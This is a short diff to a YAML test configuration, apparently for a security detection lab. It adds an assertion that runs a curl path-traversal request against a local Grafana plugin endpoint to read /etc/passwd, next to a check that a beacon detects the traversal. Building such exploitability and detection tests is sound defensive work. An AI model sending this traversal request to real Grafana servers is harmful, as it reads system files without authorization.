@@ -15,6 +15,12 @@ ready:
   interval: 3s
 
 assertions:
+  - name: exploit-grafana-read-etc-passwd
+    type: command
+    expect:
+      command: "curl -sf --path-as-is 'http://localhost:9232/public/plugins/alertlist/../../../../../../../../etc/passwd' | grep -q root"
+      exit_code: 0
+
   - name: detects-grafana-traversal
     type: beacon
     target: grafana:3000
